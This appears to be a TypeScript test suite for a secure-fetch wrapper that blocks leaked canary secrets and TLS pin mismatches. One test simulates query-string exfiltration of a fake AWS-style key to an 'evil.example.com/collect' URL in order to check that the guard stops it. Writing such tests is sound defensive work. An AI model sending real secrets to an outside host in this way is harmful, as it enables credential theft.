/**
 * Tests for createSecureFetch — canary + TLS pin enforcement at the fetch call site.
 */

import { describe, it, expect, vi } from 'vitest';
import {
  createSecureFetch,
  SecureFetchViolationError,
  type CanaryScanFn,
  type TLSValidatorFn,
} from '../src/secureFetch';

function mockResponse(body: string, contentType = 'application/json'): any {
  return {
    status: 200,
    headers: {
      get: (k: string) => (k.toLowerCase() === 'content-type' ? contentType : null),
    },
    clone() {
      return {
        headers: this.headers,
        async text() {
          return body;
        },
      };
    },
    async text() {
      return body;
    },
  };
}

describe('createSecureFetch', () => {
  it('passes through when no guards are configured', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{"ok":true}'));
    const f = createSecureFetch({ baseFetch: base });
    const res = await f('https://api.openai.com/v1/chat');
    expect(res).toBeDefined();
    expect(base).toHaveBeenCalledOnce();
  });

  it('THROWS when a canary value is in the outgoing request body', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const canaryValue = 'sk-veridex_canary_abcdef123456';
    const scanner: CanaryScanFn = (text) =>
      text.includes(canaryValue) ? [{ canaryId: 'c1', value: canaryValue }] : [];
    const f = createSecureFetch({ baseFetch: base, canaryScanner: scanner });

    await expect(
      f('https://api.example.com/hook', {
        method: 'POST',
        body: JSON.stringify({ payload: canaryValue }),
      }),
    ).rejects.toBeInstanceOf(SecureFetchViolationError);

    // Fail-closed: the underlying fetch MUST NOT have been invoked.
    expect(base).not.toHaveBeenCalled();
  });

  it('detects a canary leaked in URL (query-string exfil)', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const canaryValue = 'AKIA0123456789ABCDEF';
    const scanner: CanaryScanFn = (text) =>
      text.includes(canaryValue) ? [{ canaryId: 'c2' }] : [];
    const f = createSecureFetch({ baseFetch: base, canaryScanner: scanner });

    await expect(
      f(`https://evil.example.com/collect?k=${canaryValue}`),
    ).rejects.toBeInstanceOf(SecureFetchViolationError);
    expect(base).not.toHaveBeenCalled();
  });

  it('detects a canary reflected in the response body', async () => {
    const canaryValue = 'sk-veridex_canary_response';
    const base = vi
      .fn()
      .mockResolvedValue(mockResponse(`{"echo":"${canaryValue}"}`));
    const scanner: CanaryScanFn = (text) =>
      text.includes(canaryValue) ? [{ canaryId: 'c3' }] : [];
    const f = createSecureFetch({ baseFetch: base, canaryScanner: scanner });

    await expect(f('https://api.example.com/echo')).rejects.toBeInstanceOf(
      SecureFetchViolationError,
    );
    // Base fetch IS called for response-side detection (can't scan what hasn't arrived).
    expect(base).toHaveBeenCalledOnce();
  });

  it('does not scan binary/octet-stream responses', async () => {
    const canaryValue = 'sk-veridex_canary_bin';
    // Body accidentally contains the canary value — but content-type is binary.
    const base = vi
      .fn()
      .mockResolvedValue(mockResponse(canaryValue, 'application/octet-stream'));
    const scanner: CanaryScanFn = (text) =>
      text.includes(canaryValue) ? [{ canaryId: 'c4' }] : [];
    const f = createSecureFetch({ baseFetch: base, canaryScanner: scanner });

    const res = await f('https://api.example.com/binary');
    expect(res).toBeDefined();
  });

  it('blocks on TLS pin mismatch and invokes listener', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const validator: TLSValidatorFn = () => ({
      valid: false,
      provider: 'openai',
      hostname: 'api.openai.com',
      reason: 'fingerprint mismatch',
    });
    const listener = vi.fn();
    const f = createSecureFetch({
      baseFetch: base,
      tlsValidator: validator,
      onViolationListener: listener,
    });

    await expect(f('https://api.openai.com/v1/chat')).rejects.toBeInstanceOf(
      SecureFetchViolationError,
    );
    expect(listener).toHaveBeenCalledOnce();
    expect(listener.mock.calls[0][0].kind).toBe('tls_pin_mismatch');
    expect(base).not.toHaveBeenCalled();
  });

  it('skips TLS validation for allowlisted hosts', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const validator: TLSValidatorFn = vi.fn().mockReturnValue({
      valid: false,
      reason: 'should not be called',
    });
    const f = createSecureFetch({
      baseFetch: base,
      tlsValidator: validator,
      allowlistHosts: ['relayer.veridex.network'],
    });

    await f('https://relayer.veridex.network/status');
    expect(validator).not.toHaveBeenCalled();
    expect(base).toHaveBeenCalledOnce();
  });

  it('warn mode proceeds but still notifies the listener', async () => {
    const canaryValue = 'sk-veridex_canary_warn';
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const scanner: CanaryScanFn = (text) =>
      text.includes(canaryValue) ? [{ canaryId: 'c5' }] : [];
    const listener = vi.fn();
    const consoleWarn = vi.spyOn(console, 'warn').mockImplementation(() => {});

    const f = createSecureFetch({
      baseFetch: base,
      canaryScanner: scanner,
      onViolation: 'warn',
      onViolationListener: listener,
    });

    const res = await f('https://api.example.com/any', {
      method: 'POST',
      body: canaryValue,
    });
    expect(res).toBeDefined();
    expect(base).toHaveBeenCalledOnce();
    expect(listener).toHaveBeenCalledOnce();
    expect(consoleWarn).toHaveBeenCalled();

    consoleWarn.mockRestore();
  });

  it('silent mode proceeds silently but still notifies the listener', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const listener = vi.fn();
    const validator: TLSValidatorFn = () => ({
      valid: false,
      provider: 'unknown',
      reason: 'unknown host',
    });
    const consoleWarn = vi.spyOn(console, 'warn').mockImplementation(() => {});

    const f = createSecureFetch({
      baseFetch: base,
      tlsValidator: validator,
      onViolation: 'silent',
      onViolationListener: listener,
    });

    await f('https://unknown.example.com/ping');
    expect(base).toHaveBeenCalledOnce();
    expect(listener).toHaveBeenCalledOnce();
    expect(consoleWarn).not.toHaveBeenCalled();

    consoleWarn.mockRestore();
  });

  it('validator may mark a known router as valid — no violation', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const validator: TLSValidatorFn = () => ({
      valid: true,
      provider: 'router',
      router: true,
    });
    const listener = vi.fn();
    const f = createSecureFetch({
      baseFetch: base,
      tlsValidator: validator,
      onViolationListener: listener,
    });

    await f('https://openrouter.ai/api');
    expect(listener).not.toHaveBeenCalled();
    expect(base).toHaveBeenCalledOnce();
  });

  it('listener errors do not break the caller', async () => {
    const base = vi.fn().mockResolvedValue(mockResponse('{}'));
    const validator: TLSValidatorFn = () => ({
      valid: false,
      reason: 'bad',
    });
    const f = createSecureFetch({
      baseFetch: base,
      tlsValidator: validator,
      onViolation: 'silent',
      onViolationListener: () => {
        throw new Error('listener broken');
      },
    });

    // Silent + broken listener should still succeed.
    await expect(f('https://x.example.com/')).resolves.toBeDefined();
  });

  it('respects responseScanLimitBytes (truncation — canary after limit is missed)', async () => {
    const canaryValue = 'sk-veridex_canary_latepast';
    const prefix = 'x'.repeat(1000);
    const body = prefix + canaryValue;
    const base = vi.fn().mockResolvedValue(mockResponse(body));
    const scanner: CanaryScanFn = (text) =>
      text.includes(canaryValue) ? [{ canaryId: 'c6' }] : [];
    const f = createSecureFetch({
      baseFetch: base,
      canaryScanner: scanner,
      responseScanLimitBytes: 500, // smaller than prefix
    });

    // Canary is past the scan window → should NOT throw.
    await expect(f('https://api.example.com/trunc')).resolves.toBeDefined();
  });
});
